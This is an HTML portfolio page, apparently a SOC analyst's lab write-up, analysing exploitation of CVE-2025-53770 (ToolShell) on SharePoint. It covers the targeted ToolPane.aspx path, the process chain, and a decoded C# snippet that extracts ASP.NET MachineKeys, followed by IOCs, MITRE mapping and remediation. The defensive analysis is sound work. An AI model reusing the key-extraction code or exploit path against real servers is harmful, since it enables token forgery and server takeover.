@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CASE-004 · CVE-2025-53770 SharePoint ToolShell — José Corrales</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/x-icon" href="../img/favicon.ico">
+    <link rel="stylesheet" href="../style.css">
+    <style>
+        .case-page {
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 48px 24px 80px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--text);
+            opacity: 0.6;
+            margin-bottom: 40px;
+            transition: all var(--transition);
+        }
+        .back-link:hover { opacity: 1; color: var(--accent); }
+
+        .case-header { margin-bottom: 40px; }
+
+        .case-meta-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+
+        .case-id-label {
+            font-family: var(--font-mono);
+            font-size: 0.68rem;
+            color: var(--accent);
+            opacity: 0.7;
+            letter-spacing: 0.1em;
+        }
+
+        .case-badge {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            padding: 2px 10px;
+            border-radius: 20px;
+            letter-spacing: 0.05em;
+        }
+
+        .badge-tp {
+            background: rgba(255, 80, 80, 0.1);
+            color: #ff6b6b;
+            border: 1px solid rgba(255, 80, 80, 0.2);
+        }
+
+        .badge-closed {
+            background: rgba(0, 200, 120, 0.08);
+            color: #00c878;
+            border: 1px solid rgba(0, 200, 120, 0.2);
+        }
+
+        .badge-critical {
+            background: rgba(255, 0, 0, 0.1);
+            color: #ff4444;
+            border: 1px solid rgba(255, 0, 0, 0.25);
+        }
+
+        .case-header h1 {
+            font-family: var(--font-display);
+            font-size: clamp(1.6rem, 4vw, 2.2rem);
+            font-weight: 800;
+            color: var(--text-bright);
+            letter-spacing: -0.03em;
+            line-height: 1.2;
+            margin-bottom: 12px;
+        }
+
+        .case-header p.lead {
+            font-size: 0.95rem;
+            color: var(--text);
+            line-height: 1.75;
+            max-width: 680px;
+        }
+
+        .info-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 24px;
+            padding: 18px 20px;
+            background: var(--bg-2);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            margin-bottom: 48px;
+        }
+
+        .info-item { display: flex; flex-direction: column; gap: 3px; }
+
+        .info-label {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--accent);
+            opacity: 0.6;
+            letter-spacing: 0.08em;
+        }
+
+        .info-value {
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            color: var(--text-2);
+        }
+
+        .info-value.critical { color: #ff4444; }
+        .info-value.confirmed { color: #00c878; }
+
+        .case-section { margin-bottom: 48px; }
+
+        .case-section-title {
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            color: var(--accent);
+            opacity: 0.6;
+            letter-spacing: 0.1em;
+            margin-bottom: 6px;
+        }
+
+        .case-section h2 {
+            font-family: var(--font-display);
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: var(--text-bright);
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .case-section p {
+            font-size: 0.92rem;
+            color: var(--text);
+            line-height: 1.8;
+            margin-bottom: 14px;
+        }
+
+        .case-section ul {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .case-section ul li {
+            font-size: 0.9rem;
+            color: var(--text);
+            padding-left: 18px;
+            position: relative;
+            line-height: 1.7;
+        }
+
+        .case-section ul li::before {
+            content: '▸';
+            position: absolute;
+            left: 0;
+            color: var(--accent);
+            opacity: 0.5;
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+        }
+
+        .evidence-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            margin: 20px 0;
+            background: var(--bg-2);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+        }
+
+        .ev-row {
+            display: flex;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .ev-row:last-child { border-bottom: none; }
+
+        .ev-key {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            color: var(--accent);
+            opacity: 0.7;
+            padding: 10px 16px;
+            min-width: 180px;
+            background: rgba(0,0,0,0.15);
+            border-right: 1px solid var(--border);
+        }
+
+        .ev-val {
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--text-2);
+            padding: 10px 16px;
+            flex: 1;
+            word-break: break-all;
+        }
+
+        .ev-val.danger { color: #ff6b6b; }
+        .ev-val.warn { color: #ffa500; }
+
+        .code-block {
+            background: #050b12;
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: var(--radius);
+            padding: 16px 20px;
+            margin: 16px 0;
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            color: var(--accent);
+            overflow-x: auto;
+            line-height: 1.9;
+            word-break: break-all;
+        }
+
+        .code-block .comment { color: var(--text); opacity: 0.4; }
+        .code-block .danger { color: #ff6b6b; }
+        .code-block .warn { color: #ffa500; }
+        .code-block .ok { color: #00c878; }
+
+        .attack-timeline {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .attack-timeline::before {
+            content: '';
+            position: absolute;
+            left: 80px;
+            top: 0;
+            bottom: 0;
+            width: 1px;
+            background: var(--border);
+        }
+
+        .tl-item {
+            display: flex;
+            gap: 20px;
+            padding: 16px 0;
+        }
+
+        .tl-time {
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            color: var(--text);
+            opacity: 0.5;
+            min-width: 72px;
+            text-align: right;
+            padding-top: 2px;
+        }
+
+        .tl-dot-wrap {
+            position: relative;
+            display: flex;
+            align-items: flex-start;
+            padding-top: 6px;
+        }
+
+        .tl-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent);
+            opacity: 0.6;
+            flex-shrink: 0;
+        }
+
+        .tl-dot.high { background: #ff4444; opacity: 0.9; }
+        .tl-dot.warn { background: #ffa500; opacity: 0.8; }
+
+        .tl-content { flex: 1; padding-left: 8px; }
+
+        .tl-content strong {
+            display: block;
+            font-size: 0.9rem;
+            color: var(--text-2);
+            margin-bottom: 3px;
+        }
+
+        .tl-content p {
+            font-size: 0.84rem;
+            color: var(--text);
+            line-height: 1.6;
+            margin-bottom: 0;
+        }
+
+        .ioc-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .ioc-card {
+            padding: 14px 18px;
+            background: #050b12;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+        }
+
+        .ioc-type {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--accent);
+            opacity: 0.6;
+            min-width: 70px;
+            padding-top: 2px;
+            letter-spacing: 0.05em;
+        }
+
+        .ioc-content { flex: 1; }
+
+        .ioc-value {
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            color: #ff6b6b;
+            word-break: break-all;
+            margin-bottom: 3px;
+        }
+
+        .ioc-desc {
+            font-size: 0.8rem;
+            color: var(--text);
+            opacity: 0.7;
+        }
+
+        .mitre-block {
+            padding: 20px 24px;
+            background: var(--bg-2);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: var(--radius);
+            margin: 12px 0;
+        }
+
+        .mitre-block .mitre-id {
+            font-family: var(--font-mono);
+            font-size: 1rem;
+            color: var(--accent);
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .mitre-block .mitre-name {
+            font-size: 0.95rem;
+            color: var(--text-bright);
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .mitre-block p {
+            font-size: 0.88rem;
+            color: var(--text);
+            line-height: 1.7;
+            margin-bottom: 0;
+        }
+
+        .mitre-tags {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        .actions-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .action-item {
+            display: flex;
+            gap: 14px;
+            padding: 14px 18px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+        }
+
+        .action-num {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--accent);
+            opacity: 0.5;
+            min-width: 24px;
+            padding-top: 1px;
+        }
+
+        .action-item p {
+            font-size: 0.88rem;
+            color: var(--text);
+            line-height: 1.65;
+            margin-bottom: 0;
+        }
+
+        .action-item strong { color: var(--text-2); }
+
+        .verdict-block {
+            padding: 24px;
+            background: rgba(255, 68, 68, 0.04);
+            border: 1px solid rgba(255, 68, 68, 0.2);
+            border-radius: var(--radius);
+            margin: 20px 0;
+        }
+
+        .verdict-block .verdict-label {
+            font-family: var(--font-mono);
+            font-size: 0.68rem;
+            color: #ff4444;
+            opacity: 0.8;
+            letter-spacing: 0.1em;
+            margin-bottom: 8px;
+        }
+
+        .verdict-block p {
+            font-size: 0.92rem;
+            color: var(--text);
+            line-height: 1.8;
+            margin-bottom: 0;
+        }
+
+        .lessons-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .lesson {
+            padding: 16px 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: var(--radius);
+        }
+
+        .lesson p {
+            font-size: 0.88rem;
+            color: var(--text);
+            line-height: 1.7;
+            margin-bottom: 0;
+        }
+
+        .lesson strong { color: var(--accent); }
+
+        .note-block {
+            padding: 14px 18px;
+            background: rgba(255, 165, 0, 0.05);
+            border: 1px solid rgba(255, 165, 0, 0.2);
+            border-radius: var(--radius);
+            margin: 16px 0;
+            font-size: 0.86rem;
+            color: var(--text);
+            line-height: 1.7;
+        }
+
+        .note-block strong { color: #ffa500; }
+
+        .chain-block {
+            background: #050b12;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px 24px;
+            margin: 20px 0;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            line-height: 2.2;
+            overflow-x: auto;
+        }
+
+        .chain-step { color: var(--text-2); }
+        .chain-arrow { color: var(--accent); opacity: 0.4; margin: 0 8px; }
+        .chain-danger { color: #ff6b6b; }
+        .chain-warn { color: #ffa500; }
+        .chain-dim { color: var(--text); opacity: 0.4; font-size: 0.72rem; }
+
+        @media (min-width: 600px) {
+            .lessons-grid { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="noise" aria-hidden="true"></div>
+    <div class="cursor-glow" id="cursorGlow" aria-hidden="true"></div>
+
+    <div class="case-page">
+
+        <a href="../index.html#projects" class="back-link">
+            <i class="fas fa-arrow-left fa-xs"></i> Volver al portafolio
+        </a>
+
+        <header class="case-header">
+            <div class="case-meta-row">
+                <span class="case-id-label mono">// CASE-004 · SOC342</span>
+                <span class="case-badge badge-tp">True Positive</span>
+                <span class="case-badge badge-closed">Cerrado</span>
+                <span class="case-badge badge-critical">Critical</span>
+            </div>
+            <h1>CVE-2025-53770 ToolShell —<br>Auth Bypass + RCE en SharePoint Server</h1>
+            <p class="lead">
+                Explotación de zero-day crítico en SharePoint Server on-premises. El atacante aprovechó 
+                CVE-2025-53770 para ejecutar código sin autenticación, extraer MachineKeys del servidor, 
+                compilar un payload .NET y desplegar una webshell persistente en la infraestructura comprometida.
+            </p>
+        </header>
+
+        <div class="info-bar">
+            <div class="info-item">
+                <span class="info-label">// fecha</span>
+                <span class="info-value">22 Jul 2025 · 01:07 PM</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// severidad</span>
+                <span class="info-value critical">Crítica</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// fuente</span>
+                <span class="info-value">LetsDefend · SOC342</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// clasificación</span>
+                <span class="info-value confirmed">True Positive</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// cve</span>
+                <span class="info-value critical">CVE-2025-53770</span>
+            </div>
+        </div>
+
+        <!-- Resumen -->
+        <div class="case-section">
+            <p class="case-section-title">// 01_resumen</p>
+            <h2>Resumen ejecutivo</h2>
+            <p>
+                El sistema de detección activó la regla SOC342 al identificar una solicitud POST 
+                no autenticada contra <strong>ToolPane.aspx</strong> en el servidor SharePoint01 
+                (172.16.20.17), proveniente de <strong>107.191.58.76</strong> — IP clasificada 
+                como maliciosa en VirusTotal (malware y phishing, 12/91 motores).
+            </p>
+            <p>
+                El análisis de procesos confirmó explotación exitosa: el proceso <strong>w3wp.exe</strong> 
+                (IIS Worker Process) generó un hijo PowerShell que ejecutó un script en Base64 para 
+                extraer las MachineKeys del servidor. Posteriormente se compiló un payload .NET y se 
+                desplegó una webshell (<strong>spinstall0.aspx</strong>) en la carpeta LAYOUTS de 
+                SharePoint, otorgando al atacante acceso persistente al servidor.
+            </p>
+
+            <div class="verdict-block">
+                <p class="verdict-label">// veredicto — compromiso confirmado</p>
+                <p>
+                    <strong>True Positive crítico.</strong> Explotación exitosa de CVE-2025-53770 con RCE confirmado, 
+                    extracción de MachineKeys, compilación de payload y webshell desplegada. El servidor SharePoint01 
+                    debe considerarse completamente comprometido. Requiere aislamiento inmediato, análisis forense 
+                    completo y rotación de todas las credenciales y claves criptográficas del entorno.
+                </p>
+            </div>
+        </div>
+
+        <!-- Evidencia -->
+        <div class="case-section">
+            <p class="case-section-title">// 02_evidencia</p>
+            <h2>Evidencia técnica</h2>
+
+            <div class="evidence-grid">
+                <div class="ev-row">
+                    <span class="ev-key">Hostname víctima</span>
+                    <span class="ev-val">SharePoint01</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">IP víctima</span>
+                    <span class="ev-val">172.16.20.17</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Sistema operativo</span>
+                    <span class="ev-val">Windows Server 2019</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">IP atacante</span>
+                    <span class="ev-val danger">107.191.58.76 (Estados Unidos)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Reputación IP</span>
+                    <span class="ev-val danger">Maliciosa — Malware + Phishing · 12/91 VT</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">CVE explotado</span>
+                    <span class="ev-val danger">CVE-2025-53770 (ToolShell) — Auth Bypass + RCE</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">URL objetivo</span>
+                    <span class="ev-val danger">/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Método HTTP</span>
+                    <span class="ev-val danger">POST (payload 7699 bytes)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Referer falso</span>
+                    <span class="ev-val warn">/_layouts/SignOut.aspx (spoofed)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Webshell hash</span>
+                    <span class="ev-val danger">92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Webshell VT</span>
+                    <span class="ev-val danger">43/59 motores — Malicioso</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Acción dispositivo</span>
+                    <span class="ev-val warn">Allowed — No bloqueado</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cadena de ataque -->
+        <div class="case-section">
+            <p class="case-section-title">// 03_cadena</p>
+            <h2>Cadena de ataque completa</h2>
+            <p>
+                La siguiente cadena de procesos fue reconstruida a partir de los logs del endpoint, 
+                confirmando ejecución remota de código desde el proceso IIS hasta el despliegue de la webshell:
+            </p>
+
+            <div class="chain-block">
+                <div><span class="chain-danger">107.191.58.76</span> <span class="chain-dim">// atacante externo</span></div>
+                <div><span class="chain-arrow">▼</span> POST /_layouts/15/ToolPane.aspx <span class="chain-dim">// CVE-2025-53770 exploit</span></div>
+                <div><span class="chain-step">w3wp.exe</span> <span class="chain-dim">// IIS APPPOOL\SharePoint-80 — proceso comprometido</span></div>
+                <div><span class="chain-arrow">▼</span> spawn</div>
+                <div><span class="chain-warn">powershell.exe -EncodedCommand [Base64]</span> <span class="chain-dim">// extracción MachineKeys</span></div>
+                <div><span class="chain-arrow">▼</span> spawn</div>
+                <div><span class="chain-warn">csc.exe /out:C:\Windows\Temp\payload.exe payload.cs</span> <span class="chain-dim">// compilación .NET LOLBIN</span></div>
+                <div><span class="chain-arrow">▼</span></div>
+                <div><span class="chain-danger">cmd.exe /c echo WebShell > [...]\LAYOUTS\spinstall0.aspx</span> <span class="chain-dim">// persistencia</span></div>
+                <div><span class="chain-arrow">▼</span></div>
+                <div><span class="chain-warn">powershell.exe -Command MachineKeySection::GetApplicationConfig()</span> <span class="chain-dim">// segunda extracción</span></div>
+                <div><span class="chain-arrow">▼</span></div>
+                <div><span class="chain-step">cmd.exe /c dir C:\Windows\Temp</span> <span class="chain-dim">// reconocimiento post-compromiso</span></div>
+                <div><span class="chain-arrow">▼</span></div>
+                <div><span class="chain-step">powershell.exe -Command Get-Process</span> <span class="chain-dim">// enumeración de procesos</span></div>
+            </div>
+        </div>
+
+        <!-- Script decodificado -->
+        <div class="case-section">
+            <p class="case-section-title">// 04_payload</p>
+            <h2>Análisis del payload PowerShell</h2>
+            <p>
+                El comando PowerShell ejecutado contenía un script en Base64. Decodificado con CyberChef 
+                revela su propósito: <strong>extraer las MachineKeys de ASP.NET</strong> del servidor SharePoint.
+            </p>
+
+            <div class="code-block">
+                <span class="comment">// Decodificado desde Base64 — CyberChef</span><br><br>
+                &lt;%@ Import Namespace="System.Diagnostics" %&gt;<br>
+                &lt;%@ Import Namespace="System.IO" %&gt;<br>
+                &lt;script runat="server" language="c#" CODEPAGE="65001"&gt;<br>
+                &nbsp;&nbsp;public void Page_load()<br>
+                &nbsp;&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var sy = System.Reflection.Assembly.Load(<span class="warn">"System.Web..."</span>);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var mkt = sy.GetType(<span class="danger">"System.Web.Configuration.MachineKeySection"</span>);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var gac = mkt.GetMethod(<span class="danger">"GetApplicationConfig"</span>, BindingFlags.Static | NonPublic);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var cg = (MachineKeySection)gac.Invoke(null, new object[0]);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Response.Write(<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="danger">cg.ValidationKey</span> + "|" +<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="danger">cg.DecryptionKey</span> + "|" +<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cg.CompatibilityMode<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;);<br>
+                &nbsp;&nbsp;}<br>
+                &lt;/script&gt;
+            </div>
+
+            <p>
+                Este script extrae y expone las <strong>ValidationKey</strong> y <strong>DecryptionKey</strong> 
+                — las claves criptográficas que SharePoint usa para firmar y cifrar tokens de sesión. 
+                Con estas claves el atacante puede <strong>forjar tokens de autenticación válidos</strong> 
+                para cualquier usuario del sistema, incluyendo administradores de SharePoint y de dominio.
+            </p>
+        </div>
+
+        <!-- Timeline -->
+        <div class="case-section">
+            <p class="case-section-title">// 05_timeline</p>
+            <h2>Línea de tiempo del ataque</h2>
+
+            <div class="attack-timeline">
+                <div class="tl-item">
+                    <span class="tl-time">13:07:11</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot high"></div></div>
+                    <div class="tl-content">
+                        <strong>Explotación CVE-2025-53770</strong>
+                        <p>POST no autenticado a ToolPane.aspx con payload de 7699 bytes y referer falso (SignOut.aspx). IDS activa SOC342. El dispositivo permite la solicitud.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">13:07:11</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot high"></div></div>
+                    <div class="tl-content">
+                        <strong>RCE — w3wp.exe genera PowerShell hijo</strong>
+                        <p>Proceso IIS (w3wp.exe, PID 4560) genera powershell.exe con comando Base64 codificado. Confirma ejecución remota de código exitosa bajo contexto IIS APPPOOL\SharePoint-80.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">13:07:xx</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot high"></div></div>
+                    <div class="tl-content">
+                        <strong>Extracción de MachineKeys</strong>
+                        <p>Script decodificado accede a MachineKeySection de ASP.NET y expone ValidationKey y DecryptionKey — permite forjar tokens de autenticación para cualquier usuario.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">13:07:xx</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot warn"></div></div>
+                    <div class="tl-content">
+                        <strong>Compilación de payload con csc.exe (LOLBIN)</strong>
+                        <p>csc.exe compila payload.cs hacia payload.exe en C:\Windows\Temp usando el compilador .NET legítimo del sistema — técnica living-off-the-land para evadir detección.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">13:07:xx</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot high"></div></div>
+                    <div class="tl-content">
+                        <strong>Despliegue de webshell — spinstall0.aspx</strong>
+                        <p>cmd.exe escribe spinstall0.aspx en la carpeta LAYOUTS de SharePoint (hash 43/59 VT). El atacante obtiene acceso persistente al servidor via HTTP sin necesitar reexplotar la vulnerabilidad.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">Post</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot warn"></div></div>
+                    <div class="tl-content">
+                        <strong>Reconocimiento post-compromiso</strong>
+                        <p>dir C:\Windows\Temp y Get-Process enumeran el sistema. Apertura de Chrome y notes.txt sugieren exploración manual del entorno comprometido.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- IOCs -->
+        <div class="case-section">
+            <p class="case-section-title">// 06_iocs</p>
+            <h2>Indicadores de compromiso (IOCs)</h2>
+
+            <div class="ioc-grid">
+                <div class="ioc-card">
+                    <span class="ioc-type">IP</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">107.191.58.76</div>
+                        <div class="ioc-desc">IP atacante — Estados Unidos · Malware + Phishing · 12/91 VT</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">URL</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx</div>
+                        <div class="ioc-desc">Endpoint explotado — CVE-2025-53770</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">SHA256</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514</div>
+                        <div class="ioc-desc">spinstall0.aspx — WebShell · 43/59 VT</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">ARCHIVO</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">C:\Windows\Temp\payload.exe</div>
+                        <div class="ioc-desc">Payload compilado con csc.exe en el servidor</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">ARCHIVO</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">C:\Program Files\...\LAYOUTS\spinstall0.aspx</div>
+                        <div class="ioc-desc">WebShell persistente en carpeta LAYOUTS de SharePoint</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MITRE -->
+        <div class="case-section">
+            <p class="case-section-title">// 07_mitre</p>
+            <h2>Mapeo MITRE ATT&CK</h2>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1190 — Exploit Public-Facing Application</div>
+                <div class="mitre-name">Táctica: Initial Access</div>
+                <p>Explotación de CVE-2025-53770 en SharePoint Server on-premises para obtener ejecución de código sin autenticación a través de una solicitud HTTP maliciosa.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1190</span>
+                    <span class="tag">Initial Access</span>
+                    <span class="tag">TA0001</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1059.001 — PowerShell</div>
+                <div class="mitre-name">Táctica: Execution</div>
+                <p>Ejecución de scripts PowerShell con comandos codificados en Base64 para evadir detección y ejecutar el payload de extracción de MachineKeys.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1059.001</span>
+                    <span class="tag">Execution</span>
+                    <span class="tag">TA0002</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1505.003 — Web Shell</div>
+                <div class="mitre-name">Táctica: Persistence</div>
+                <p>Despliegue de spinstall0.aspx en la carpeta LAYOUTS de SharePoint para mantener acceso persistente al servidor sin necesidad de reexplotar la vulnerabilidad inicial.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1505.003</span>
+                    <span class="tag">Persistence</span>
+                    <span class="tag">TA0003</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1552.004 — Private Keys</div>
+                <div class="mitre-name">Táctica: Credential Access</div>
+                <p>Extracción de MachineKeys (ValidationKey y DecryptionKey) de ASP.NET mediante reflexión .NET, permitiendo al atacante forjar tokens de autenticación válidos para cualquier usuario.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1552.004</span>
+                    <span class="tag">Credential Access</span>
+                    <span class="tag">TA0006</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1127 — Trusted Developer Utilities Proxy Execution</div>
+                <div class="mitre-name">Táctica: Defense Evasion</div>
+                <p>Uso de csc.exe (compilador C# legítimo de .NET Framework) para compilar y ejecutar código malicioso, evitando alertas de herramientas que confían en binarios firmados de Microsoft.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1127</span>
+                    <span class="tag">Defense Evasion</span>
+                    <span class="tag">LOLBIN</span>
+                    <span class="tag">TA0005</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Acciones -->
+        <div class="case-section">
+            <p class="case-section-title">// 08_acciones</p>
+            <h2>Acciones tomadas</h2>
+
+            <div class="actions-list">
+                <div class="action-item">
+                    <span class="action-num">01</span>
+                    <p><strong>Verificación de la IP atacante:</strong> 107.191.58.76 confirmada como maliciosa en VirusTotal (malware + phishing, 12/91). Sin registros de ejercicio o pentest programado en correos del período.</p>
+                </div>
+                <div class="action-item">
+                    <span class="action-num">02</span>
+                    <p><strong>Análisis de la solicitud HTTP:</strong> POST a ToolPane.aspx con payload de 7699 bytes y referer falsificado (SignOut.aspx) — patrón documentado de explotación de CVE-2025-53770.</p>
+                </div>
+                <div class="action-item">
+                    <span class="action-num">03</span>
+                    <p><strong>Análisis de cadena de procesos:</strong> w3wp.exe generando PowerShell hijo confirma RCE exitoso. Script Base64 decodificado con CyberChef revela extracción de MachineKeys.</p>
+                </div>
+                <div class="action-item">
+                    <span class="action-num">04</span>
+                    <p><strong>Identificación de webshell:</strong> spinstall0.aspx localizado en carpeta LAYOUTS de SharePoint. Hash verificado en VirusTotal — 43/59 detecciones maliciosas. No se encontró propagación a otros endpoints.</p>
+                </div>
+                <div class="action-item">
+                    <span class="action-num">05</span>
+                    <p><strong>Clasificación:</strong> True Positive confirmado — explotación de zero-day con RCE, extracción de claves criptográficas, compilación de payload y persistencia establecida.</p>
+                </div>
+            </div>
+
+            <div class="note-block">
+                <strong>Punto de mejora identificado:</strong> El proceso de verificación de ejercicios programados requiere búsqueda exhaustiva en el sistema de correo usando múltiples filtros — IP atacante, IP víctima, nombre del host, código CVE y nombre de archivos involucrados. La ausencia de resultados debe documentarse explícitamente como parte del proceso antes de clasificar el caso.
+            </div>
+        </div>
+
+        <!-- Recomendaciones -->
+        <div class="case-section">
+            <p class="case-section-title">// 09_recomendaciones</p>
+            <h2>Recomendaciones</h2>
+            <ul>
+                <li><strong>Aislamiento inmediato</strong> de SharePoint01 — el servidor debe considerarse completamente comprometido</li>
+                <li><strong>Eliminar webshell</strong> spinstall0.aspx de la carpeta LAYOUTS y auditar toda la carpeta en busca de archivos adicionales no autorizados</li>
+                <li><strong>Rotar todas las MachineKeys</strong> de ASP.NET — las ValidationKey y DecryptionKey fueron expuestas, permitiendo forjar tokens de sesión</li>
+                <li><strong>Invalidar todas las sesiones activas</strong> de SharePoint — los tokens existentes pueden haber sido comprometidos</li>
+                <li><strong>Aplicar el parche de Microsoft</strong> para CVE-2025-53770 de forma urgente en todos los servidores SharePoint on-premises del entorno</li>
+                <li><strong>Análisis forense completo</strong> del servidor para determinar si se produjo movimiento lateral usando los tokens forjados</li>
+                <li><strong>Revisar logs de acceso</strong> a SharePoint buscando sesiones autenticadas originadas desde 107.191.58.76 o con tokens generados tras el compromiso</li>
+                <li>Implementar <strong>WAF con reglas específicas</strong> para bloquear patrones de explotación de ToolPane.aspx</li>
+            </ul>
+        </div>
+
+        <!-- Lecciones -->
+        <div class="case-section">
